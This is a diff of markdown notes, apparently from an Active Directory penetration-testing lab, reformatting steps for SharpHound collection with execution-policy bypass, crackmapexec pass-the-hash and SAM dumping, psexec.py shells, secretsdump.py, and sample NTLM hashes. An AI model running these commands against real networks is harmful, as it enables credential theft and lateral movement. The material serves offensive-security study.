@@ -45,7 +45,7 @@ kali$ bloodhound && then login with new creds.
 
 **Download Ingestor:**
 
-on W10 download sharphound.ps1
+W10 download sharphound.ps1
 ```
 > powershell -ep bypass \
 > . .\sharphound.ps1 \ 
@@ -62,34 +62,37 @@ import data :: enjoy
 ## **Attacking AD - Post-Compromise Attacks:**
 
 ## **3. Pass-The-Hash:**
-
-`apt install crackmapexec`
-`crackmapexec smb 192.168.86.0/24 -d carbon.local -u e.triage -p 'Password!1'`
+```
+apt install crackmapexec \ 
+crackmapexec smb 192.168.86.0/24 -d carbon.local -u e.triage -p 'Password!1' \
+```
 ![PTH_propanol_oxytocinDC_ethyl](Screenshots/Pass_Hash_e_triage.png)
 
-`crackmapexec smb 192.168.86.0/24 -d carbon.local -u e.triage -p 'Password!1' --sam`
+`crackmapexec smb 192.168.86.0/24 -d carbon.local -u e.triage -p 'Password!1' --sam` \ 
 
-![PTH_sam](Screenshots/PTH_sam.png)
+![PTH_sam](Screenshots/PTH_sam.png) 
 
-`psexec.py carbon.local/e.triage:'Password!1'@192.168.86.206`
+`psexec.py carbon.local/e.triage:'Password!1'@192.168.86.206` \
 
 
-![psexec_loud_shell](Screenshots/psexec_shell_noisy.png)
+![psexec_loud_shell](Screenshots/psexec_shell_noisy.png) \ 
 
 ### **Secretsdump.py:**
 
-`secretsdump.py carbon/e.triage:'Password!1'@192.168.86.206`
+`secretsdump.py carbon/e.triage:'Password!1'@192.168.86.206` \
 
 
 ![secrets](Screenshots/secrets_dump.png)
 
 ### **NTLM hash Example:**
+````
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
 
-```Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: ```
+Propylene  Malz:1001:aad3b435b51404eeaad3b435b51404ee:3d888ed3f1196c792588c37ddfd32746:::
 
-```Propylene  Malz:1001:aad3b435b51404eeaad3b435b51404ee:3d888ed3f1196c792588c37ddfd32746:::```
+Ethyl Triage:1001:aad3b435b51404eeaad3b435b51404ee:2d450bc49b158d89cc6ec49db47ba095:::
 
-```Ethyl Triage:1001:aad3b435b51404eeaad3b435b51404ee:2d450bc49b158d89cc6ec49db47ba095:::```
+```
 
 ***You can pass NTLM hashes around but CANNOT pass NTLMv2 hashes***
 
